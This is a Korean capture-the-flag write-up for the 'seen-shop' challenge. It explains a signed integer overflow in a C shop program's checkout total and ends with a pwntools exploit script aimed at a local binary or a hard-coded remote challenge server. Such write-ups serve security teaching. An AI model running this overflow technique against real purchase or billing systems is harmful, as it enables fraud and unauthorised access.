# NOWRUZ 1404

# seen-shop

```c
void checkout(Seen seens[], int quantities[]) {
    int total = 0;
    puts("Your Basket:");
    for (int i = 0; i < NUM_SEENS; i++) {
        if (quantities[i] > 0) {
            printf("%s - %d item = %d Toman\n", seens[i].name, quantities[i], seens[i].price * quantities[i]);
            total += seens[i].price * quantities[i];
        }
    }

    printf("Total: %d\n",total);
    if(total > credit){
        puts("Not enough credit.");
        exit(0);
    }

    if(quantities[6] > 10){
        puts("oh... pole ke mirize...");
        system("cat /flag");
    }
    puts("Thank you ~~ Have a nice Nowruz!");
    exit(0);
}
```

`checkout` 함수를 호출했을 때, `seens[i].price * quantities[i]`가 `credit`보다 작고 `quantities[6]`이 10보다 크면 플래그를 출력해준다.

```c
void addToBasket(Seen seens[], int quantities[]) {
    int item, qty;
    displayMenu(seens);
    printf("Enter item number to add (1-7): ");
    scanf("%d", &item);
    if (item < 1 || item > NUM_SEENS) {
        puts("Invalid item.");
        return;
    }
    printf("Enter quantity: ");
    scanf("%d", &qty);
    if (qty < 1) {
        puts("Invalid quantity.");
        return;
    }
    quantities[item - 1] += qty;
    printf("Added %d %s(s) to your basket.\n", qty, seens[item - 1].name);
}
```

`quantities[6]`의 값은 `addToBasket` 함수에서 원하는 값으로 설정 가능하다.

```c
typedef struct {
    char name[20];
    int price;
} Seen;
int credit;

[...]

Seen seens[NUM_SEENS] = {
    {"Sabzeh", 30000},
    {"Senjed", 20000},
    {"Seer", 20000},
    {"Seeb", 10000},
    {"Samanu", 35000},
    {"Serkeh", 40000},
    {"Sekkeh", 80000000}
};

[...]

credit = 1000000;

```

`addToBasket` 함수에서 `quantities[6]`의 값을 임의로 설정할 수 있기에  `quantities[6]` 의 값을 10보다 크게 하는것은 문제가 되지 않지만 `seens[6].price(80000000) * quantities[6](> 10)` 

가 `credit(1000000)` 보다 작게 해야한다.

```c
void checkout(Seen seens[], int quantities[]) {
    int total = 0;
    puts("Your Basket:");
    for (int i = 0; i < NUM_SEENS; i++) {
        if (quantities[i] > 0) {
            printf("%s - %d item = %d Toman\n", seens[i].name, quantities[i], seens[i].price * quantities[i]);
            total += seens[i].price * quantities[i];
        }
    }
    
    [...]
```

`seens[6].price * quantities[6]` 의 결과가 담기는 변수 `total`은 `signed int`이기 때문에 만일 계산결과가 매우 크다면 `total` 변수의 부호비트가 바뀌며 음수가 될 것이다.

이를 통해 `quantities[6]`는 `10` 보다 크며 `seens[6].price * quantities[6]` 는 `1000000`보다 작은 음수가 되도록 할 수 있다.

```python
#!/usr/bin/env python3

from pwn import *

# Function Aliases
# sendlineafter
def sla(x, y): return io.sendlineafter(x, y)
# sendafter
def sa(x, y): return io.sendafter(x, y)
# send-line
def sl(x): return io.sendline(x)
# send
def s(x): return io.send(x)

# recv-until
def rvu(x): return io.recvuntil(x)
# recv
def rv(x): return io.recv(x)
# recv-line
def rvl(): return io.recvline()

# log info
def li(x): return log.info(x)
# log success
def ls(x): return log.success(x)
# log failure
def lf(x): return log.failure(x)

# Context Settings
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = [
    'tmux',
    'new-window',
    '-n', 'DEBUG-exploit'
]

# Bind Settings
bin_path = "./seen-shop"
e = ELF(bin_path)

# IO Settings
server_addr = "164.92.176.247"
server_port = 9000

if args['REMOTE']:
    io = remote(server_addr, server_port)
else:
    io = process([e.path], stdin=PTY)

# Main Code
def main():
    sla(b": ", b"1")
    sla(b": ", b"7")
    sla(b": ", b"100")

    sla(b": ", b"2")
    io.interactive()

if __name__ == "__main__":
    main()
```